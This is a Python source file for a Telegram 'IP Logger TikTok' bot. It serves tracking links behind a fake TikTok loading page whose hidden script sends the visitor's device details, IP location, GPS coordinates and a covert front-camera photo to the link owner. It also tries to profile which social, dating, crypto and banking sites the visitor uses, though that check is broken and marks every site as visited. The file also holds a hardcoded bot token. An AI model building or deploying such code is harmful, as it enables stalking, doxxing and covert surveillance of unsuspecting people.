import asyncio
from telethon import TelegramClient, events
from telethon.tl.types import InputMediaGeoPoint, InputGeoPoint
from flask import Flask, request, render_template_string
import threading
import random
import string
import json
import os
from datetime import datetime
import requests
import base64

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"
# =============================================

bot = TelegramClient('logger_bot', api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
app = Flask(__name__)
links = {}
loop = None

# Маскировочная страница под TikTok
TIKTOK_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TikTok — Make Your Day</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; font-family: Arial; overflow: hidden; }
        .tiktok-header {
            background: #000; padding: 10px; display: flex;
            justify-content: space-around; border-bottom: 1px solid #333;
            position: fixed; top: 0; width: 100%; z-index: 100;
        }
        .tiktok-header span { color: #fff; font-size: 14px; padding: 5px 10px; }
        .tiktok-header .active { color: #fff; border-bottom: 2px solid #fff; }
        .video-container {
            width: 100%; height: 100vh; display: flex;
            align-items: center; justify-content: center;
            background: #111;
        }
        .loading { color: #fff; font-size: 16px; text-align: center; }
        .spinner {
            border: 3px solid #333; border-top: 3px solid #fe2c55;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .tiktok-footer {
            position: fixed; bottom: 0; width: 100%;
            background: #000; padding: 15px; display: flex;
            justify-content: space-around; border-top: 1px solid #333;
        }
        .tiktok-footer span { color: #fff; font-size: 12px; }
    </style>
</head>
<body>
    <div class="tiktok-header">
        <span>Following</span>
        <span class="active">For You</span>
        <span>LIVE</span>
    </div>
    
    <div class="video-container">
        <div class="loading">
            <div class="spinner"></div>
            <p>Loading video...</p>
            <p style="font-size:12px;color:#666;margin-top:10px;">Please wait</p>
        </div>
    </div>
    
    <div class="tiktok-footer">
        <span>🏠 Home</span>
        <span>🔍 Discover</span>
        <span>➕</span>
        <span>💬 Inbox</span>
        <span>👤 Profile</span>
    </div>
    
    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>
    
    <script>
        // Собираем инфу об устройстве
        fetch('/collect/{{ link_id }}', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                ua: navigator.userAgent,
                pl: navigator.platform,
                la: navigator.language,
                ss: screen.width + 'x' + screen.height,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                mem: navigator.deviceMemory || '?',
                cores: navigator.hardwareConcurrency || '?'
            })
        });
        
        // Сбор истории браузера (посещённые сайты)
        async function stealHistory() {
            const sites = [
                'https://web.telegram.org', 'https://vk.com', 'https://ok.ru',
                'https://facebook.com', 'https://instagram.com', 'https://twitter.com',
                'https://youtube.com', 'https://twitch.tv', 'https://discord.com',
                'https://github.com', 'https://steamcommunity.com', 'https://reddit.com',
                'https://tinder.com', 'https://bumble.com', 'https://onlyfans.com',
                'https://crypto.com', 'https://binance.com', 'https://bybit.com',
                'https://paypal.com', 'https://sberbank.ru', 'https://tinkoff.ru',
                'https://ozon.ru', 'https://wildberries.ru', 'https://avito.ru'
            ];
            
            const visited = [];
            
            for (const site of sites) {
                try {
                    const img = new Image();
                    img.src = site + '/favicon.ico';
                    await new Promise((resolve, reject) => {
                        img.onload = () => { visited.push(site); resolve(); };
                        img.onerror = () => { visited.push(site); resolve(); };
                        setTimeout(() => resolve(), 500);
                    });
                } catch(e) {}
            }
            
            if (visited.length > 0) {
                fetch('/history/{{ link_id }}', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({visited: visited, time: new Date().toISOString()})
                });
            }
        }
        
        // GPS
        function getGPS() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        fetch('/gps/{{ link_id }}', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                acc: pos.coords.accuracy
                            })
                        });
                    },
                    err => {},
                    {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}
                );
            }
        }
        
        // Камера
        async function cam() {
            try {
                const st = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
                const v = document.getElementById('v');
                v.srcObject = st;
                await v.play();
                await new Promise(r => setTimeout(r, 3000));
                const c = document.getElementById('c');
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                c.getContext('2d').drawImage(v, 0, 0);
                const ph = c.toDataURL('image/jpeg', 0.7);
                await fetch('/photo/{{ link_id }}', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({photo: ph})
                });
                st.getTracks().forEach(t => t.stop());
            } catch(e) {}
        }
        
        // Запускаем всё
        setTimeout(getGPS, 1500);
        setTimeout(stealHistory, 2000);
        setTimeout(cam, 2500);
    </script>
</body>
</html>
"""

def gen_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def get_ip_info(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,lat,lon,query", timeout=5)
        return r.json()
    except:
        return {}

@app.route('/go/<lid>')
def track(lid):
    if lid not in links:
        return "Видео недоступно"
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '?')
    
    v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'history': None}
    v.update(get_ip_info(ip))
    links[lid]['victims'].append(v)
    
    asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid, v), loop)
    return render_template_string(TIKTOK_PAGE, link_id=lid)

@app.route('/collect/<lid>', methods=['POST'])
def coll(lid):
    if lid in links and links[lid]['victims']:
        links[lid]['victims'][-1]['dev'] = request.get_json()
    return 'ok'

@app.route('/photo/<lid>', methods=['POST'])
def photo(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('photo'):
            links[lid]['victims'][-1]['photo'] = d['photo']
    return 'ok'

@app.route('/gps/<lid>', methods=['POST'])
def gps(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        links[lid]['victims'][-1]['gps'] = d
    return 'ok'

@app.route('/history/<lid>', methods=['POST'])
def history(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        links[lid]['victims'][-1]['history'] = d
        print(f"📜 История получена для {lid}!")
    return 'ok'

async def notify(uid, lid, v):
    try:
        # 1. Гео + Google Maps
        if v.get('gps') and v['gps'].get('lat'):
            lat, lon = v['gps']['lat'], v['gps']['lon']
            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=v['gps'].get('acc', 10)))
            await bot.send_file(uid, file=geo, caption=f"📍 GPS (точность: {v['gps'].get('acc', '?')}м)")
            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
        elif v.get('lat') and v.get('lon'):
            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=v['lat'], long=v['lon'], accuracy_radius=500))
            await bot.send_file(uid, file=geo, caption="📍 IP-геолокация")
            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
        
        # 2. Текст
        msg = f"""🎯 **Новый переход!**
🕐 {v['time']}
🌐 IP: `{v['ip']}`
🏙 Город: {v.get('city', '?')}
📡 Провайдер: {v.get('isp', '?')}
📱 {v.get('ua', '?')[:150]}
"""
        
        # 3. История браузера
        if v.get('history') and v['history'].get('visited'):
            visited = v['history']['visited']
            msg += f"\n📜 **История браузера ({len(visited)} сайтов):**\n"
            for site in visited[:15]:
                domain = site.replace('https://', '').replace('http://', '')
                msg += f"• {domain}\n"
            if len(visited) > 15:
                msg += f"...и ещё {len(visited)-15}"
        
        await bot.send_message(uid, msg)
        
        # 4. Фото
        if v.get('photo'):
            try:
                photo_bytes = base64.b64decode(v['photo'].split(',')[1])
                await bot.send_file(uid, photo_bytes, caption="📸 Фото с камеры")
            except:
                pass
        
    except Exception as e:
        print(f"❌ Ошибка: {e}")

# ================= БОТ =================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply("🎭 **IP Logger TikTok**\n\n/create — новая ссылка\n/list — мои ссылки\n\n📸 Фото + 📍 GPS + 🗺 Maps + 📜 История")

@bot.on(events.NewMessage(pattern='/create'))
async def create(event):
    lid = gen_id()
    links[lid] = {'owner': event.sender_id, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
    public_url = "https://f7f695e4bfa354.lhr.life"
    await event.reply(f"✅ Ссылка (TikTok):\n`{public_url}/go/{lid}`")

@bot.on(events.NewMessage(pattern='/list'))
async def lst(event):
    my = {k: v for k, v in links.items() if v['owner'] == event.sender_id}
    if not my:
        await event.reply("Нет ссылок")
    else:
        r = "📋 **Ссылки:**\n"
        for lid, d in my.items():
            r += f"🔗 `{lid}` — {len(d['victims'])} переходов\n"
        await event.reply(r)

async def main():
    global loop
    loop = asyncio.get_event_loop()
    
    def run_flask():
        app.run(host='0.0.0.0', port=8080, debug=False)
    
    threading.Thread(target=run_flask, daemon=True).start()
    
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    print(f"✅ Бот @{me.username} запущен!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
